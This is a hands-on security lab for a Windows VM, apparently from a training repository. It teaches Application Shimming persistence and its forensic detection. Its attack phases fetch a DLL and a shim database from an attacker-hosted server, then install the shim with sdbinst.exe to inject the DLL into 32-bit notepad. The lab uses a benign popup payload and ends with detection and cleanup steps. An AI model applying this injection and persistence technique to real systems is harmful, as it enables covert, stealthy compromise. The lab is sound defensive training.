![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

# SDB-Explorer

# Windows VM

## The objective of this lab is to use Application Shimming (via the native sdbinst.exe utility) to silently inject a demonstration DLL into a trusted Windows process, establishing persistent execution — and then use sdb-explorer to forensically expose the hidden attack.

---

### Documentation and Scenario:

**What is Application Shimming?**

The Windows Application Compatibility framework — commonly called the **Shim Engine** — is a legitimate Microsoft technology designed to resolve software compatibility issues between older applications and newer versions of Windows. Instead of modifying application code directly, Windows can intercept specific API calls and transparently reroute them through a compatibility layer, or "shim."

Shims are defined inside **Shim Database files (.sdb)**, binary files installed system-wide using the native Windows utility **sdbinst.exe**. Once a shim is installed, it persists across reboots and applies automatically every time a targeted application is launched — silently, in the background, with no user awareness.

If you want to dive a bit deeper, check the [Windows Application Compatibility Documentation](https://docs.microsoft.com/en-us/windows/win32/devnotes/application-compatibility-database).

**Key Concepts:**

- *Shim Database (.sdb)* : A binary file that defines compatibility fixes targeting specific executable names. Once installed, it is stored in a protected system directory and registered in the Windows registry.

- *sdbinst.exe* : A native, Microsoft-signed Windows utility for installing and uninstalling Shim Databases. Because it is a trusted, pre-existing system binary, its execution is rarely flagged by antivirus software.

- *InjectDll Fix* : A powerful shim type that instructs the Windows Application Compatibility Engine to automatically load an arbitrary DLL into a target process's memory at launch time. This is the core mechanism attackers abuse for persistence.

- *sdb-explorer* : A forensic command-line tool capable of parsing and displaying the contents of Shim Database (.sdb) files in human-readable form, exposing hidden fixes, targeted executables, and injected DLL paths.

>[!NOTE]
> Application Shimming is a textbook **"Living off the Land" (LotL)** persistence technique. The attacker uses **sdbinst.exe** — a legitimate, Microsoft-signed binary that already exists on every Windows installation — to deploy their payload. To the operating system, the Windows Event Log, and most endpoint security tools, this action looks completely routine.


---

### **SCENARIO:**

- In this lab, we simulate a targeted persistence attack using two machines on the same subnet. *The Ubuntu VM acts as the attacker's staging server*, while *the Windows VM represents a compromised corporate endpoint*.

- The attacker has already achieved initial access to the Windows machine. Their goal now is to **establish persistent access** that survives reboots and requires no further interaction.

- To accomplish this, the attacker installs a custom **Shim Database (patch.sdb)** that abuses the Windows Application Compatibility framework. Crucially, modern Windows builds restrict `InjectDll` shims on native 64-bit processes. To bypass this security boundary, adversaries often target the 32-bit versions of legitimate system binaries residing in `C:\Windows\SysWOW64\`.

- In our scenario, the attacker targets the 32-bit **notepad.exe**. For educational and safety purposes, instead of deploying a dangerous reverse shell payload, our injected DLL (**demo.dll**) will execute benign proof-of-concept actions: displaying a warning popup and dropping an execution log to disk.

>[!IMPORTANT]
> You will start on the **Windows VM**, but consider all commands typed into the **Ubuntu Shell** as actions performed by the attacker on their remote staging server.

---

### Phase 1: Setup and Objective (Windows)

Before starting the simulation, we must initialize our local endpoint. We need to prepare our workspace and apply least-privilege firewall rules for this session.

1. Open a **PowerShell** terminal as **Administrator**.

<img width="519" height="396" alt="image" src="https://github.com/user-attachments/assets/93150de2-b86f-4dcb-80bc-1f6067846d71" />

2. Navigate to the pre-created lab directory and execute the session starter script:

```powershell
cd Desktop\Labs\SdbExplorerLab
.\lab_start.ps1
```
Once you see the green sign [✓], leave this Administrator terminal open for later steps.

<img width="742" height="513" alt="image" src="https://github.com/user-attachments/assets/f5905648-a04b-413b-a59c-a27ccd045306" />

### Phase 2: Staging the Attack (Ubuntu)

As the attacker, your tools are pre-staged on the Ubuntu server. You simply need to start a web server to make the payload files available for download to the compromised endpoint.

- Open an Ubuntu Shell terminal:

<img width="388" height="489" alt="image" src="https://github.com/user-attachments/assets/4f75c43c-43ee-49f0-b23d-08eb146ab986" />

- In the **Lab Directory**, start a *python server* : 

```bash
cd ~/BnB/SdbExplorer
python3 -m http.server 8001
```

<img width="607" height="167" alt="image" src="https://github.com/user-attachments/assets/d4a7fdaf-2617-4397-8adf-5a3ecb917bf1" />

>[!NOTE]
>Note down your <UBUNTU_IP> — you will need it in the next phase.

The Lab Directory contains three pre-staged files:

* demo.dll — a 32-bit demonstration payload compiled to trigger a visible popup and log execution.

* patch.sdb — a Shim Database pre-configured to inject demo.dll into notepad.exe.

* sdb-explorer.exe — the forensic analysis tool.

<img width="628" height="162" alt="image" src="https://github.com/user-attachments/assets/79acf40a-b082-41ce-a299-ca605a76855a" />

### Phase 3: Payload Delivery & Shim Installation (Windows)

Switch back to the compromised Windows machine. Using your Administrator PowerShell terminal, download the attack tools from the Ubuntu staging server and silently install the Shim.

- Download all three files. Replace <UBUNTU_IP> with your actual Ubuntu IP address:

```powershell
# Download the benign DLL to a plausible, user-writable location
Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/demo.dll" -OutFile "C:\Users\Public\demo.dll"

# Download the Shim Database to a temporary folder
Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/patch.sdb" -OutFile "$env:TEMP\patch.sdb"

# Download the forensic tool (used in the Blue Team phase)
Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/sdb-explorer.exe" -OutFile "C:\Users\Public\sdb-explorer.exe"
```

<img width="1492" height="65" alt="image" src="https://github.com/user-attachments/assets/088eb0b7-26ee-42af-b902-c31fbbe048ca" />

- In the server terminal, three *GET* requests should be visible now: 

<img width="649" height="156" alt="image" src="https://github.com/user-attachments/assets/16763bc5-e763-42d8-904f-830f4f860f4e" />

- Now, install the Shim Database using sdbinst.exe — a fully legitimate, Microsoft-signed Windows binary. This is the heart of the Living off the Land technique:

```powershell
sdbinst.exe "$env:TEMP\patch.sdb"
```

You will see a brief confirmation message. Quietly and without any visible indication to regular users, the OS has now been instructed to **inject demo.dll** into every future instance of the 32-bit notepad.exe.

<img width="898" height="100" alt="image" src="https://github.com/user-attachments/assets/ea0634fc-0046-409a-88c6-ed9631e4402b" />

### Phase 4: Triggering the Persistence

This is the moment of truth. To demonstrate that persistence applies system-wide regardless of who launches the application, let's simulate a standard non-technical user.

- Open a NEW, standard PowerShell terminal (WITHOUT Administrator privileges) and launch the 32-bit version of Notepad:

```powershell
Start-Process C:\Windows\SysWOW64\notepad.exe
```

- Instantly, a warning Message Box titled "SdbExplorer Lab — Shim Active" will appear on your screen, and an execution log has been secretly dropped to C:\Windows\Temp\shimmed.log.

Even though a standard user opened a legitimate Windows utility, the Application Compatibility Engine intercepted the process execution and injected the unauthorized payload into Notepad's memory space.

>[!IMPORTANT]
>Click OK on the popup, but leave the Notepad window open for the Blue Team detection phase.

### Phase 5: Blue Team Detection

Time to switch perspective. You are now a security analyst responding to an endpoint behavioral alert. You do not yet know the persistence mechanism used — but you are about to forensically uncover it.

Switch back to your Administrator PowerShell terminal.

- Step 1 — Verify Physical Artifact Creation. Attackers often drop log files or temporary data during execution. Let's inspect the anomalous log file generated during the trigger phase:

```powershell
Get-Content C:\Windows\Temp\shimmed.log
```

The log text explicitly confirms that a DLL was injected into the current process via Application Shimming.

- Step 2 — Inspect Running Process Modules. Let's examine the running notepad.exe process to see what dynamic link libraries are currently loaded inside its memory space:

```powershell
Get-Process notepad | Select-Object -ExpandProperty Modules | Where-Object { $_.FileName -like "*Users\Public*" }
```

You will clearly see C:\Users\Public\demo.dll loaded inside Notepad. Legitimate Windows system binaries rarely, if ever, load DLLs from public, user-writable directories.

- Step 3 — Check the AppCompat Registry for Installed Shims. sdbinst.exe always records installed database fixes within the Windows Registry. Let's check:

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB"
```

You will see a GUID-based entry referencing an installed .sdb file. Its presence on a standard user endpoint — where IT-managed compatibility shims are rarely deployed — is a major anomaly.

- Step 4 — Locate the SDB File on Disk. Shims installed by sdbinst.exe are stored in protected system directories, renamed with cryptic GUIDs so they blend in with OS files:

```powershell
ls C:\Windows\apppatch\Custom\
ls C:\Windows\apppatch\Custom64\
```

You will find a .sdb file matching the registry GUID. This is the attacker's patch.sdb hiding in plain sight.

- Step 5 — Expose the Attack with sdb-explorer. Native Windows utilities cannot easily parse binary SDB files. Point sdb-explorer.exe at the suspicious database file you discovered:

```powershell
$sdbFile = (Get-ChildItem C:\Windows\apppatch\Custom\ -Filter "*.sdb" | Select-Object -First 1).FullName
cd C:\Users\Public
.\sdb-explorer.exe $sdbFile
```

The tool parses the proprietary binary format and reveals the exact instructions inside:

-The targeted executable: notepad.exe

-The fix type applied: InjectDll

-The path of the injected payload: C:\Users\Public\demo.dll

This is the smoking gun. A persistent system rule instructing Windows to silently inject an arbitrary DLL into a core OS utility whenever it runs.

### Cleanup

Let's clean up the endpoint and remove all lab artifacts.

- On Ubuntu: Press CTRL+C in the terminal to stop the Python web server.

- On Windows: In your Administrator PowerShell, uninstall the Shim Database rule:

```powershell
sdbinst.exe -u "$env:TEMP\patch.sdb"
```

Remove all downloaded payloads and log files:

```powershell
Remove-Item "C:\Users\Public\demo.dll" -Force
Remove-Item "C:\Users\Public\sdb-explorer.exe" -Force
Remove-Item "C:\Windows\Temp\shimmed.log" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\patch.sdb" -Force
```

Close Notepad and all active terminal windows.

### Conclusion

- In this lab, you experienced a complete persistence attack cycle built entirely on native OS mechanics. 

- An adversary with administrative privileges can silently install a Shim Database using a trusted, signed Windows utility (sdbinst.exe), causing a benign application like Notepad to execute unauthorized code automatically across reboots. As a Blue Teamer, you learned to identify the subtle forensic footprints: abnormal DLL modules loaded in process memory, suspicious registry modifications under AppCompatFlags, and GUID-named binary files inside Windows system folders. Using sdb-explorer, you successfully parsed the binary database and exposed the exact payload path concealed within.

### Finished?

[Back to Card's Main Page]()
